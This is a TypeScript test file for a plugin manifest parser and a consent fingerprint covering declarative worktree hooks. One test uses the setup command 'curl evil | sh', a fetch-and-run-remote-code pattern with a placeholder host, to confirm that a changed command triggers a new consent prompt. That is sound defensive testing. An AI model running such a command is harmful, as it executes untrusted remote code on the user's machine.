import { describe, expect, it } from 'vitest'
import { fingerprintPluginConsent } from './plugin-consent-fingerprint'
import { parsePluginManifest } from './plugin-manifest'
import type { PluginWorktreeHookContribution } from './plugin-content-pack-contributions'

const HOOK = {
  id: 'git-workspace',
  title: 'git-workspace lifecycle',
  setup: 'orca-git-workspace setup',
  archive: 'orca-git-workspace archive'
}

function manifest(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    manifestVersion: 1,
    id: 'git-workspace',
    publisher: 'ewilazarus',
    name: 'git-workspace',
    version: '1.0.0',
    engines: { orca: '>=1.0.0' },
    pluginApi: 1,
    contributes: { worktreeHooks: [HOOK] },
    capabilities: [{ kind: 'repo:hooks' }],
    ...overrides
  }
}

describe('contributes.worktreeHooks', () => {
  it('accepts a declarative hook set without a worker', () => {
    const result = parsePluginManifest(manifest())
    expect(result.ok && result.manifest.contributes.worktreeHooks).toEqual([HOOK])
  })

  it('defaults to no hooks for existing manifests', () => {
    const result = parsePluginManifest(manifest({ contributes: {}, capabilities: [] }))
    expect(result.ok && result.manifest.contributes.worktreeHooks).toEqual([])
  })

  it('requires the repo:hooks capability so consent names it', () => {
    expect(parsePluginManifest(manifest({ capabilities: [] }))).toEqual({
      ok: false,
      error:
        'capabilities: repo:hooks capability required when contributes.worktreeHooks is non-empty'
    })
  })

  it('rejects a hook set with no command and duplicate ids', () => {
    expect(
      parsePluginManifest(
        manifest({ contributes: { worktreeHooks: [{ id: 'empty', title: 'Empty', setup: '  ' }] } })
      ).ok
    ).toBe(false)
    const duplicate = parsePluginManifest(
      manifest({ contributes: { worktreeHooks: [HOOK, { ...HOOK, title: 'Again' }] } })
    )
    expect(duplicate).toEqual({
      ok: false,
      error: 'contributes.worktreeHooks.1: duplicate worktreeHooks id: git-workspace'
    })
  })

  it('rejects unknown fields instead of silently ignoring them', () => {
    expect(
      parsePluginManifest(
        manifest({ contributes: { worktreeHooks: [{ ...HOOK, setupRunPolicy: 'ask' }] } })
      ).ok
    ).toBe(false)
  })
})

describe('worktree hook consent fingerprint', () => {
  const capabilities = [{ kind: 'repo:hooks' as const }]
  const fingerprint = (worktreeHooks: PluginWorktreeHookContribution[]): string =>
    fingerprintPluginConsent({ main: undefined, capabilities, contributes: { worktreeHooks } })

  it('leaves plugins without hooks on their existing fingerprint', () => {
    expect(fingerprint([])).toBe(fingerprintPluginConsent({ main: undefined, capabilities }))
  })

  it('asks again when a command changes, but not for a title or order change', () => {
    const base = fingerprint([HOOK])
    expect(fingerprint([{ ...HOOK, setup: 'curl evil | sh' }])).not.toBe(base)
    expect(fingerprint([{ ...HOOK, archive: undefined }])).not.toBe(base)
    expect(fingerprint([{ ...HOOK, title: 'Renamed' }])).toBe(base)
    const other = { ...HOOK, id: 'other' }
    expect(fingerprint([HOOK, other])).toBe(fingerprint([other, HOOK]))
  })
})
